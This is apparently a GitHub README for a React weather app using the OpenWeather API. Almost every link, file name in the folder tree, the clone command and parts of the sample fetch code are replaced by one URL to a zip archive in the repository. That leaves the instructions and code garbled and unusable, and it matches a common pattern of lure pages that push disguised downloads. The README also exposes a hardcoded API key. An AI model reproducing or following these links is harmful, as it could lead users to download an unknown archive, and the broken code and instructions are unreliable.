# 🌦️ Weather App — Real-Time Weather using OpenWeather API

A clean, responsive, and modern https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip web application that fetches **real-time weather data** for any city using the **OpenWeather API**.  
It includes animated weather icons, caching with LocalStorage, and API rate-limit handling — all styled with a premium UI.

---

## 🚀 Features

✅ **Real-time Weather Data** — Fetches current temperature, weather condition, humidity, and wind speed for any city.  
✅ **Responsive UI** — Works seamlessly on desktop, tablet, and mobile.  
✅ **Animated Weather Icons** — Dynamic icons change based on weather conditions (sun, clouds, rain, etc.).  
✅ **LocalStorage Caching** — Saves recent searches and caches results for faster reloads.  
✅ **API Rate-Limit Handling** — Detects HTTP 429 errors and shows a friendly retry message.  
✅ **Modern, Clean Design** — Built with plain CSS (no frameworks) using glass-style effects and soft gradients.

---

## 🧠 Tech Stack

- **https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip (Vite)** — Front-end framework  
- **OpenWeather API** — Real-time weather data provider  
- **HTML5 / CSS3 / JavaScript (ES6+)** — UI and logic  
- **LocalStorage API** — Client-side caching  
- **React Icons (optional)** — Animated SVG icons  

---

## 🗂️ Folder Structure

weather-app/ │ ├── public/ │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │ ├── src/ │   ├── assets/ │   ├── components/ │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │ │   ├── hooks/ │   │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │ │   ├── icons/ │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │ │   ├── services/ │   │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │ │   ├── utils/ │   │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │ │   ├── styles/ │   │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   │ │   ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │   └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip │ ├── .env ├── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip └── https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip

---

## ⚙️ Setup Instructions

### 1️⃣ Clone this repository
```bash
git clone https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip
cd weather-app

2️⃣ Install dependencies

npm install

3️⃣ Add your OpenWeather API key

Create a .env file in the project root:

VITE_OPENWEATHER_API_KEY=7c240d63c71652de4ca96b7c526095b4

You can get a free API key from https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip

4️⃣ Run the app

npm run dev

Then open your browser at: 👉 http://localhost:5173


---

🧩 Example Fetch Request

const apiKey = https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip;
const city = "Pune";

fetch(`https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip${city}&appid=${apiKey}&units=metric`)
  .then(res => https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip())
  .then(data => https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip(data))
  .catch(err => https://raw.githubusercontent.com/pooja819/weather-app/main/boucherize/weather-app.zip(err));

---

💾 Caching Logic Overview

Feature	Description

LocalStorage Key	weather_app_cache_v1::<city>
TTL (Time To Live)	10 minutes (configurable)
Recent Searches Key	weather_app_recent_searches_v1
Usage	The app checks cache before calling API. If cached data is still valid, it shows (using cached data) below the location name.

---

📱 Responsiveness

Uses CSS Grid and Flexbox for adaptive layout.

Fully responsive on mobile, tablet, and desktop.

Smooth hover and animation effects for interactive feel.


---

🧑‍💻 Author

Developed by: Pooja Kalukhe

---

💙 If you like this project:

⭐ Star it on GitHub

📂 Fork it for your own improvements

🧩 Connect to discuss collaborations